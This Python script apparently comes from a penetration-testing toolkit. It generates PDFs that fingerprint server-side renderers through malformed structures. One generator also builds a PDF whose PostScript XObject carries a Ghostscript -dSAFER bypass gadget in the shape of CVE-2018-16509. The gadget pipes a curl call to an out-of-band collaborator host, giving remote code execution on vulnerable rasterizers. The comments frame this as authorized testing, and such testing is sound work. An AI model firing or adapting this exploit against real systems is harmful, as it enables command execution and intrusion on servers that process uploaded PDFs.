#!/usr/bin/env python3
# Generate renderer-fingerprinting PDFs + a Ghostscript PostScript-XObject PDF.
# AUTHORIZED SECURITY TESTING USE ONLY.
#
# The fingerprinting PDFs all draw a visible black square, so a renderer that
# parses them produces a NON-blank page (reaches the next pipeline stage),
# while a renderer that rejects the quirk fails with the generic decode error.
# The differential response/timing is the fingerprint.
#
# Usage:  python3 -I gen_payloads.py [output_dir]
#         default output_dir = ../payloads
import os
import sys
import zlib

OUT = sys.argv[1] if len(sys.argv) > 1 else os.path.join(
    os.path.dirname(os.path.abspath(__file__)), "..", "payloads")
OUT = os.path.abspath(OUT)

# visible content: black fill + rectangle + fill  -> non-blank page
CONTENT = b"0 0 0 rg\n50 50 100 100 re\nf\n"


def assemble(bodies, header=b"%PDF-1.4", break_xref=False):
    """Assemble objects (1..N) with a classic xref table. If break_xref, write
    zeroed offsets + startxref 0 to force the renderer's repair path."""
    out = bytearray(header + b"\n%\xe2\xe3\xcf\xd3\n")
    offsets = []
    for i, body in enumerate(bodies, start=1):
        offsets.append(len(out))
        out += ("%d 0 obj\n" % i).encode() + body + b"\nendobj\n"
    xref_pos = len(out)
    n = len(bodies) + 1
    out += b"xref\n0 " + str(n).encode() + b"\n0000000000 65535 f \n"
    for off in offsets:
        out += (b"0000000000 00000 n \n" if break_xref
                else ("%010d 00000 n \n" % off).encode())
    out += b"trailer\n<< /Size " + str(n).encode() + b" /Root 1 0 R >>\nstartxref\n"
    out += (b"0" if break_xref else str(xref_pos).encode()) + b"\n%%EOF\n"
    return bytes(out)


def page_bodies(mediabox=b"[0 0 200 200]", length_override=None,
                resources=b"<< >>", content=CONTENT, extra=None):
    length = length_override if length_override is not None else len(content)
    bodies = [
        b"<< /Type /Catalog /Pages 2 0 R >>",
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        b"<< /Type /Page /Parent 2 0 R /MediaBox " + mediabox
        + b" /Contents 4 0 R /Resources " + resources + b" >>",
        b"<< /Length " + str(length).encode() + b" >>\nstream\n" + content + b"\nendstream",
    ]
    if extra:
        bodies += extra
    return bodies


def classic(**kw):
    header = kw.pop("header", b"%PDF-1.4")
    break_xref = kw.pop("break_xref", False)
    return assemble(page_bodies(**kw), header=header, break_xref=break_xref)


# ----- renderer-fingerprinting set ------------------------------------------

def fp_nonblank():
    # baseline: valid, non-blank. Should pass a blank-page check everywhere.
    return classic()


def fp_badxref():
    # valid objects, deliberately broken xref offsets + startxref 0.
    # repair-capable engines (Ghostscript, poppler) rebuild and render;
    # strict engines fail.
    return classic(break_xref=True)


def fp_wronglength():
    # content stream /Length understated (5 vs real 28). Lenient engines scan
    # to 'endstream' and render fully; strict engines truncate -> blank/error.
    return classic(length_override=5)


def fp_largemediabox():
    # unusual large page (2000x2000 pt ~ 28in). Probes dimension handling.
    # NOTE: this is the SAFE default. Scaling the MediaBox far larger is a
    # memory/DoS test -- only with explicit authorization, and start small.
    return classic(mediabox=b"[0 0 2000 2000]")


def fp_pdf20():
    # same content, PDF 2.0 header. Some engines warn / behave differently.
    return classic(header=b"%PDF-2.0")


def fp_objstm():
    # PDF 1.5 compressed object stream (/ObjStm) + cross-reference stream.
    # Engines without ObjStm/xref-stream support fail; modern ones render.
    # Objects 1,2,3 (dicts) live inside the ObjStm (obj 5). Obj 4 is the page
    # content stream (streams cannot live in an ObjStm). Obj 6 is the XRef stream.
    o1 = b"<< /Type /Catalog /Pages 2 0 R >>"
    o2 = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"
    o3 = (b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] "
          b"/Contents 4 0 R /Resources << >> >>")
    members = [(1, o1), (2, o2), (3, o3)]

    # build ObjStm payload: header "num off num off ..." then the objects
    objdata = bytearray()
    offs = []
    for _, body in members:
        offs.append(len(objdata))
        objdata += body + b"\n"
    header = b""
    for (num, _), off in zip(members, offs):
        header += ("%d %d " % (num, off)).encode()
    first = len(header)
    objstm_raw = bytes(header) + bytes(objdata)
    objstm_comp = zlib.compress(objstm_raw)

    out = bytearray(b"%PDF-1.5\n%\xe2\xe3\xcf\xd3\n")
    pos = {}

    pos[4] = len(out)
    out += (b"4 0 obj\n<< /Length " + str(len(CONTENT)).encode()
            + b" >>\nstream\n" + CONTENT + b"\nendstream\nendobj\n")

    pos[5] = len(out)
    out += (b"5 0 obj\n<< /Type /ObjStm /N " + str(len(members)).encode()
            + b" /First " + str(first).encode()
            + b" /Filter /FlateDecode /Length " + str(len(objstm_comp)).encode()
            + b" >>\nstream\n" + objstm_comp + b"\nendstream\nendobj\n")

    # cross-reference stream (obj 6), /W [1 2 1]
    def entry(t, f2, f3):
        return bytes([t]) + f2.to_bytes(2, "big") + bytes([f3])
    xref_rows = b""
    xref_rows += entry(0, 0, 255)          # obj 0 free
    xref_rows += entry(2, 5, 0)            # obj 1 -> in ObjStm 5, index 0
    xref_rows += entry(2, 5, 1)            # obj 2 -> index 1
    xref_rows += entry(2, 5, 2)            # obj 3 -> index 2
    xref_rows += entry(1, pos[4], 0)       # obj 4 uncompressed
    xref_rows += entry(1, pos[5], 0)       # obj 5 uncompressed
    xref_pos = len(out)
    xref_rows += entry(1, xref_pos, 0)     # obj 6 (this xref stream) points to itself
    xref_comp = zlib.compress(xref_rows)

    out += (b"6 0 obj\n<< /Type /XRef /Size 7 /Root 1 0 R /W [1 2 1] "
            b"/Index [0 7] /Filter /FlateDecode /Length "
            + str(len(xref_comp)).encode() + b" >>\nstream\n"
            + xref_comp + b"\nendstream\nendobj\n")
    out += b"startxref\n" + str(xref_pos).encode() + b"\n%%EOF\n"
    return bytes(out)


# ----- Ghostscript PostScript-XObject route ---------------------------------

def gs_ps_xobject():
    # A PDF whose page invokes a PostScript XObject (/Subtype /PS). If the
    # rasterizer is Ghostscript and routes the embedded PostScript to its
    # interpreter, the gadget runs. The gadget is a version-dependent -dSAFER
    # bypass (CVE-2018-16509 shape) wired to a BENIGN OOB probe: curl to the
    # Collaborator host. {{COLLAB}} is substituted per-send by the extension.
    #
    # IMPORTANT:
    #  * RCE-class. Confirm Ghostscript RCE is in scope before firing.
    #  * Version-dependent: swap the gadget body to match the fingerprinted GS
    #    version (different CVEs use different bypass operators).
    #  * After {{COLLAB}} substitution the PS stream /Length no longer matches;
    #    Ghostscript tolerates this (it scans to 'endstream'). For a strict
    #    target, regenerate byte-perfect with gen_gs_xobject.py <host>.
    ps = (b"%!PS\n"
          b"userdict /setpagedevice undef\n"
          b"save\n"
          b"legal\n"
          b"{ null restore } stopped { pop } if\n"
          b"{ legal } stopped { pop } if\n"
          b"restore\n"
          b"mark /OutputFile (%pipe%curl http://{{COLLAB}}/gspsxobj) "
          b"currentdevice putdeviceprops\n")
    content = b"q\n/Fm0 Do\nQ\n"
    resources = b"<< /XObject << /Fm0 5 0 R >> >>"
    extra = [b"<< /Type /XObject /Subtype /PS /Length "
             + str(len(ps)).encode() + b" >>\nstream\n" + ps + b"\nendstream"]
    bodies = page_bodies(content=content, resources=resources, extra=extra)
    return assemble(bodies)


FILES = {
    "pdf_nonblank_probe.pdf": fp_nonblank,
    "fp_badxref.pdf": fp_badxref,
    "fp_wronglength.pdf": fp_wronglength,
    "fp_largemediabox.pdf": fp_largemediabox,
    "fp_pdf20.pdf": fp_pdf20,
    "fp_objstm.pdf": fp_objstm,
    "gs_ps_xobject.pdf": gs_ps_xobject,
}


def main():
    os.makedirs(OUT, exist_ok=True)
    for name, fn in FILES.items():
        data = fn()
        with open(os.path.join(OUT, name), "wb") as f:
            f.write(data)
        token = " [has {{COLLAB}}]" if b"{{COLLAB}}" in data else ""
        print("wrote %-24s %6d bytes%s" % (name, len(data), token))
    print("-> %s" % OUT)


if __name__ == "__main__":
    main()
